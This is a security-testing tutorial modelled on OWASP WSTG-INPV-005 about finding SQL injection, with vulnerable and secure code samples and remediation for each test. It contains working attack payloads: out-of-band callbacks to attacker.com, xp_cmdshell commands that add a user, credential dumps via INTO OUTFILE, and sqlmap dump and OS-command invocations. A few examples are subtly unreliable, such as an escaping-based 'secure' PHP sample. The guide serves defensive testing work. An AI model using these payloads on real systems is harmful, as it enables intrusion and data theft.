# Testing for SQL Injection Vulnerabilities

## Overview

Testing for SQL Injection vulnerabilities involves verifying that a web application properly sanitizes user input to prevent attackers from manipulating SQL queries executed by the database. According to OWASP (WSTG-INPV-005), SQL Injection occurs when untrusted input is embedded into SQL queries without proper validation, allowing attackers to extract data, bypass authentication, escalate privileges, or execute system commands. This guide provides a comprehensive methodology to test for SQL Injection vulnerabilities, covering basic injection, advanced SQLMap usage, non-classic vectors, out-of-band (OOB) techniques, database-specific payloads, evasion techniques, automation, and exploitation beyond data extraction, with tools, commands, payloads, and remediation strategies.

**Impact**: SQL Injection vulnerabilities can lead to:
- Unauthorized access to sensitive data (e.g., user credentials, financial records).
- Authentication bypass or privilege escalation.
- Remote code execution (RCE) on the server.
- Data corruption or deletion.
- Non-compliance with security standards (e.g., PCI DSS, GSSOC-4).

This guide aligns with OWASP’s WSTG-INPV-005, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as SQL Injection attempts may access sensitive data, disrupt database operations, or trigger unintended actions, potentially causing significant harm.

## Testing Tools

The following tools are recommended for testing SQL Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject SQL payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads, Proxy > HTTP History to identify endpoints, and Collaborator for OOB testing.
  - **Note**: Install extensions like SQLiPy or ActiveScan++ for automation.

- **SQLMap**: Automates SQL injection testing and exploitation.
  - Install on Linux:
    ```bash
    sudo apt install sqlmap
    ```
  - Install on Windows/Mac: Download from [sqlmap.org](https://sqlmap.org/).
  - Example:
    ```bash
    sqlmap -u "http://example.com/page?id=1" --dbs
    ```

- **OWASP ZAP 3.2**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with SQL injection rules; manually verify findings.

- **cURL and HTTPie**: Send HTTP requests with SQL payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie**:
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?id=1' OR '1'='1"
      # HTTPie
      http "http://example.com/page?id=1' OR '1'='1"
      ```

- **Postman**: GUI tool for testing SQL injection in APIs.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send JSON/XML payloads with injection.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools**: Inspects requests and responses.
  - Access: `F12` or `Ctrl+Shift+I`.
  - Use Network Monitor to analyze responses and Firefox’s 2025 debugger for enhanced inspection.

- **Netcat (nc)**: Tests raw HTTP requests and listens for OOB callbacks.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Example:
    ```bash
    echo -e "GET /page?id=1' OR '1'='1 HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

- **dnslog.cn**: Detects OOB DNS-based SQL injection.
  - Access: [dnslog.cn](http://dnslog.cn/).
  - Generate a unique subdomain and monitor DNS requests.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-005, testing SQL Injection vulnerabilities across basic injection, form-based injection, error-based injection, advanced SQLMap usage, non-classic vectors, out-of-band (OOB) techniques, database-specific payloads, evasion techniques, automation, and exploitation beyond extraction.

### Common SQL Injection Payloads

Below is a list of common payloads to test for SQL Injection vulnerabilities. Start with simple payloads to detect vulnerabilities, then escalate to advanced, database-specific, or obfuscated payloads. Use with caution in controlled environments to avoid data corruption.

- **Basic Injection Payloads**:
  - `' OR '1'='1` (Authentication bypass)
  - `' OR 1=1 --` (Comment out query)
  - `' UNION SELECT NULL, NULL --` (Union-based)
  - `' ORDER BY 1 --` (Column enumeration)

- **Error-Based Payloads**:
  - `' AND 1=CONVERT(int,@@version) --` (MSSQL error)
  - `' AND 1=CAST(version() AS int) --` (PostgreSQL error)
  - `' AND (SELECT COUNT(*) FROM dual)=1 --` (Oracle error)
  - `' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --` (MySQL error)

- **Non-Classic Vector Payloads**:
  - **Header**: `User-Agent: ' OR '1'='1`
  - **Cookie**: `session=1' OR '1'='1`
  - **JSON**: `{"id":"1' OR '1'='1"}`
  - **XML**: `<id>1' OR '1'='1</id>`

- **Out-of-Band (OOB) Payloads**:
  - `'; EXEC xp_dirtree('\\attacker.com\foo') --` (MSSQL)
  - `SELECT LOAD_FILE(CONCAT('\\\\',@@hostname,'.attacker.com\\')) --` (MySQL)
  - `'; DECLARE @q varchar(99); SET @q='\\attacker.com\foo'; EXEC master.dbo.xp_dirtree @q --` (MSSQL)
  - `UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual --` (Oracle)

- **Database-Specific Payloads**:
  - **MySQL**: `' UNION SELECT @@version --`
  - **MSSQL**: `' EXEC xp_cmdshell('dir') --`
  - **Oracle**: `' AND 1=(SELECT COUNT(*) FROM all_users) --`
  - **SQLite**: `' UNION SELECT sqlite_version() --`
  - **PostgreSQL**: `' AND 1=(SELECT version()) --`

- **Evasion Payloads**:
  - `%27%20OR%20%271%27=%271` (URL-encoded)
  - `'%09OR%09'1'='1` (Tab-separated)
  - `/*comment*/' OR '1'='1` (Inline comment)
  - `' oR '1'='1` (Case manipulation)

- **Stored Injection Payloads**:
  - `' OR 1=1; INSERT INTO logs (data) VALUES ('malicious') --`
  - `' UNION SELECT username, password FROM users INTO OUTFILE '/var/www/dump.txt' --`
  - `' OR 1=1; UPDATE users SET role='admin' WHERE id=1 --`
  - `' EXEC sp_addlogin 'hacker','password' --`

- **Exploitation Payloads**:
  - `' EXEC xp_cmdshell('net user hacker pass /add') --` (MSSQL RCE)
  - `' AND 1=(SELECT sys_exec('whoami')) --` (Oracle RCE)
  - `' UNION SELECT 'sa', NULL FROM sys.sql_logins --` (MSSQL privilege check)
  - `' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com')) --` (Oracle OOB)

**Note**: Payloads depend on the database (e.g., MySQL, MSSQL) and input context (e.g., URL, JSON). Test payloads in query parameters, POST bodies, headers, cookies, or API payloads where queries are constructed.

### 1. Test for Basic SQL Injection (URL-Based)

**Objective**: Verify if URL parameters are vulnerable to SQL injection.

**Steps**:
1. Identify URL parameters:
   - Visit: `http://example.com/page?id=1`.
2. Inject basic payloads:
   - Use Burp Repeater:
     ```http
     GET /page?id=1' OR '1'='1 HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?id=1' OR '1'='1"
     ```
3. Check responses:
   - Look for unauthorized data or success (e.g., all records).
   - Test: `' OR 1=1 --`, `' UNION SELECT NULL --`.
4. Test error payloads:
   - Try: `' AND 1=1 --`.

**Example Vulnerable Code (PHP)**:
```php
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");
```
Test: `?id=1' OR '1'='1`
Result: Returns all users.

**Example Secure Code (PHP)**:
```php
$id = mysqli_real_escape_string($conn, $_GET['id']);
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = '$id'");
```
Test: No injection.

**Remediation**:
- Use prepared statements:
  ```php
  $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->bind_param("i", $id);
  ```
- Validate input:
  ```php
  if (!is_numeric($id)) die("Invalid ID");
  ```

**Tip**: Save injection evidence in a report.

### 2. Test for Form-Based SQL Injection

**Objective**: Check if form inputs are vulnerable to SQL injection.

**Steps**:
1. Identify forms:
   - Look for login or search forms.
2. Inject payloads:
   - Use Burp:
     ```http
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded

     username=admin' OR '1'='1&password=test
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/login username="admin' OR '1'='1" password=test
     ```
3. Check responses:
   - Look for login bypass or data exposure.
   - Test: `' OR 1=1 --`.
4. Test stored injection:
   - Try: `' OR 1=1; INSERT INTO logs (data) VALUES ('malicious') --`.

**Example Vulnerable Code (Python)**:
```python
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```
Test: `username=admin' OR '1'='1`
Result: Bypasses login.

**Example Secure Code (Python)**:
```python
username = request.form['username']
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```
Test: No bypass.

**Remediation**:
- Use parameterized queries:
  ```python
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
  ```
- Sanitize input:
  ```python
  if not username.isalnum(): raise ValueError("Invalid username")
  ```

**Tip**: Save form injection evidence in a report.

### 3. Test for Error-Based SQL Injection

**Objective**: Exploit database errors to extract information.

**Steps**:
1. Inject error payloads:
   - Test: `' AND 1=CONVERT(int,@@version) --`
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?id=1' AND 1=CONVERT(int,@@version) --"
     ```
2. Check responses:
   - Look for database version or schema details.
   - Test: `' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --`.
3. Test variations:
   - Try: `' AND 1=(SELECT COUNT(*) FROM dual) --` (Oracle).
4. Use Burp Repeater:
   - Analyze error messages.

**Example Vulnerable Code (PHP)**:
```php
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = '$id'");
```
Test: `?id=1' AND 1=CONVERT(int,@@version) --`
Result: Exposes MSSQL version.

**Example Secure Code (PHP)**:
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
```
Test: No errors.

**Remediation**:
- Disable error messages:
  ```php
  ini_set('display_errors', 0);
  ```
- Use prepared statements:
  ```php
  $stmt->bind_param("i", $id);
  ```

**Tip**: Save error-based evidence in a report.

### 4. Test for Advanced SQLMap Usage

**Objective**: Use SQLMap for advanced testing scenarios.

**Steps**:
1. Test authenticated endpoints:
   - Use SQLMap:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123" --dbs
     ```
   - Add credentials:
     ```bash
     sqlmap -u "http://example.com/login" --auth-type=basic --auth-cred="user:pass" --dbs
     ```
2. Test POST data:
   - Use:
     ```bash
     sqlmap -u "http://example.com/login" --data="username=admin&password=test" --dbs
     ```
3. Test JSON/XML:
   - Use:
     ```bash
     sqlmap -u "http://example.com/api" --data='{"id":"1"}' --headers="Content-Type: application/json" --dbs
     ```
4. Enumerate database:
   - Use:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --dbs --tables --columns --dump
     ```
5. Save output:
   - Use:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --output-dir=/tmp/sqlmap_output
     ```

**Example Vulnerable Endpoint**:
- `POST /api/login` with `{"username":"admin"}`
Test: `sqlmap -u "http://example.com/api/login" --data='{"username":"admin"}' --dump`
Result: Dumps users table.

**Remediation**:
- Validate inputs:
  ```python
  if not request.json['username'].isalnum(): raise ValueError
  ```
- Use parameterized queries:
  ```python
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
  ```

**Tip**: Save SQLMap logs in a report.

### 5. Test for Non-Classic SQL Injection Vectors

**Objective**: Check headers, cookies, and APIs for SQL injection.

**Steps**:
1. Inject into headers:
   - Use Burp:
     ```http
     GET /page HTTP/1.1
     Host: example.com
     User-Agent: ' OR '1'='1
     ```
2. Inject into cookies:
   - Use:
     ```http
     GET /page HTTP/1.1
     Host: example.com
     Cookie: session=1' OR '1'='1
     ```
3. Test JSON/XML APIs:
   - Use Postman:
     ```json
     POST /api/search
     Content-Type: application/json
     {"query":"1' OR '1'='1"}
     ```
4. Test mobile app traffic:
   - Intercept with Burp:
     ```bash
     adb connect <device_ip>
     ```
     Configure proxy and test APIs.
5. Test stored injection:
   - Submit: `' OR 1=1; INSERT INTO logs (data) VALUES ('malicious') --`.

**Example Vulnerable Code (Node.js)**:
```javascript
const query = `SELECT * FROM users WHERE id = '${req.headers['user-agent']}'`;
db.query(query);
```
Test: `User-Agent: ' OR '1'='1`
Result: Returns all users.

**Example Secure Code (Node.js)**:
```javascript
const query = `SELECT * FROM users WHERE id = ?`;
db.query(query, [req.headers['user-agent']]);
```
Test: No injection.

**Remediation**:
- Sanitize headers:
  ```javascript
  if (!/^[a-zA-Z0-9]+$/.test(req.headers['user-agent'])) throw Error
  ```
- Escape cookies:
  ```javascript
  const session = escape(req.cookies.session);
  ```

**Tip**: Save non-classic vector evidence in a report.

### 6. Test for Out-of-Band (OOB) SQL Injection

**Objective**: Detect SQL injection via external interactions.

**Steps**:
1. Inject OOB payloads:
   - Test: `'; EXEC xp_dirtree('\\attacker.com\foo') --`
   - Use Burp:
     ```http
     GET /page?id=1'; EXEC xp_dirtree('\\attacker.com\foo') -- HTTP/1.1
     Host: example.com
     ```
2. Monitor callbacks:
   - Use Burp Collaborator or dnslog.cn.
   - Test: `SELECT LOAD_FILE(CONCAT('\\\\',@@hostname,'.attacker.com\\')) --`.
3. Test Oracle OOB:
   - Try: `UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual --`.
4. Use SQLMap:
   ```bash
   sqlmap -u "http://example.com/page?id=1" --dns-domain=attacker.com
   ```

**Example Vulnerable Code (MSSQL)**:
```sql
EXEC(@query)
```
Test: `'; EXEC xp_dirtree('\\attacker.com\foo') --`
Result: Triggers DNS request.

**Example Secure Code (MSSQL)**:
```sql
EXEC sp_executesql @query, N'@id int', @id
```
Test: No OOB.

**Remediation**:
- Restrict network access:
  ```sql
  DENY CONNECT ON DATABASE::master TO public
  ```
- Use parameterized queries:
  ```sql
  EXEC sp_executesql @query, N'@id int', @id
  ```

**Tip**: Save OOB callback evidence in a report.

### 7. Test for Database-Specific Payload Tuning

**Objective**: Exploit database-specific SQL injection quirks.

**Steps**:
1. Identify database:
   - Use: `' UNION SELECT @@version --` (MySQL/MSSQL).
2. Inject database-specific payloads:
   - **Oracle**: `' AND 1=(SELECT COUNT(*) FROM all_users) --`
   - **MSSQL**: `' EXEC xp_cmdshell('dir') --`
   - **SQLite**: `' UNION SELECT sqlite_version() --`
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?id=1' AND 1=(SELECT COUNT(*) FROM all_users) --"
     ```
3. Check responses:
   - Look for database-specific output.
4. Use SQLMap:
   ```bash
   sqlmap -u "http://example.com/page?id=1" --dbms=oracle --tables
   ```

**Example Vulnerable Code (Java)**:
```java
String query = "SELECT * FROM users WHERE id = '" + id + "'";
stmt.executeQuery(query);
```
Test: `id=1' AND 1=(SELECT COUNT(*) FROM all_users) --`
Result: Oracle-specific output.

**Example Secure Code (Java)**:
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setString(1, id);
```
Test: No injection.

**Remediation**:
- Use prepared statements:
  ```java
  stmt.setString(1, id);
  ```
- Database-specific filters:
  ```java
  if (id.contains("all_users")) throw new SQLException();
  ```

**Tip**: Save database-specific evidence in a report.

### 8. Test for Detection Evasion & Obfuscation

**Objective**: Bypass WAFs or filters using evasion techniques.

**Steps**:
1. Inject obfuscated payloads:
   - Test: `%27%20OR%20%271%27=%271`
   - Use Burp:
     ```http
     GET /page?id=1%27%20OR%20%271%27=%271 HTTP/1.1
     Host: example.com
     ```
2. Use SQLMap tamper scripts:
   - Use:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,base64encode
     ```
3. Test encoding:
   - Try: `/*comment*/' OR '1'='1`, `' oR '1'='1`.
4. Monitor WAF logs:
   - Use regex to detect blocked payloads.

**Example Vulnerable Code (PHP)**:
```php
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = '$_GET[id]'");
```
Test: `?id=1%27%20OR%20%271%27=%271`
Result: Bypasses WAF.

**Example Secure Code (PHP)**:
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
```
Test: No bypass.

**Remediation**:
- Decode inputs:
  ```php
  $id = urldecode($_GET['id']);
  ```
- Use WAF rules:
  ```nginx
  if ($args ~* "union.*select") { return 403; }
  ```

**Tip**: Save evasion evidence in a report.

### 9. Test for Automation and Scripting

**Objective**: Automate SQL injection detection across multiple endpoints.

**Steps**:
1. Collect URLs:
   - Use:
     ```bash
     waybackurls example.com | grep -E "id=|query=" > urls.txt
     ```
2. Test with SQLMap:
   - Use:
     ```bash
     sqlmap -m urls.txt --batch --dbs
     ```
3. Use Burp extensions:
   - Install SQLiPy or ActiveScan++.
   - Run Active Scan on crawled site.
4. Script with Python:
   - Use:
     ```python
     import requests
     payloads = ["' OR '1'='1", "' UNION SELECT NULL --"]
     for url in open('urls.txt'):
         for payload in payloads:
             r = requests.get(url.strip() + payload)
             if "error" in r.text.lower(): print(f"Vulnerable: {url}")
     ```

**Example Vulnerable Endpoint**:
- `http://example.com/page?id=1`
Test: `sqlmap -m urls.txt --batch`
Result: Identifies vulnerable URLs.

**Remediation**:
- Rate-limit APIs:
  ```nginx
  limit_req zone=api burst=10;
  ```
- Validate inputs:
  ```python
  if not id.isdigit(): raise ValueError
  ```

**Tip**: Save automation results in a report.

### 10. Test for Exploitation Beyond Extraction

**Objective**: Escalate SQL injection to privilege escalation or RCE.

**Steps**:
1. Check privileges:
   - Test: `' UNION SELECT 'sa', NULL FROM sys.sql_logins --` (MSSQL).
2. Execute commands:
   - Test: `' EXEC xp_cmdshell('net user hacker pass /add') --`
   - Use SQLMap:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"
     ```
3. Pivot to RCE:
   - Test (Oracle): `' AND 1=(SELECT sys_exec('whoami')) --`.
4. Test modern frontends:
   - Inject GraphQL:
     ```graphql
     query { user(id: "1' OR '1'='1") { name } }
     ```
   - Test SPA APIs with Burp.

**Example Vulnerable Code (MSSQL)**:
```sql
EXEC(@query)
```
Test: `' EXEC xp_cmdshell('dir') --`
Result: Lists directory.

**Example Secure Code (MSSQL)**:
```sql
EXEC sp_executesql @query, N'@id int', @id
```
Test: No RCE.

**Remediation**:
- Restrict permissions:
  ```sql
  REVOKE EXECUTE ON xp_cmdshell TO public
  ```
- Use least privilege:
  ```sql
  GRANT SELECT ON users TO app_user
  ```

**Tip**: Save exploitation evidence in a report.
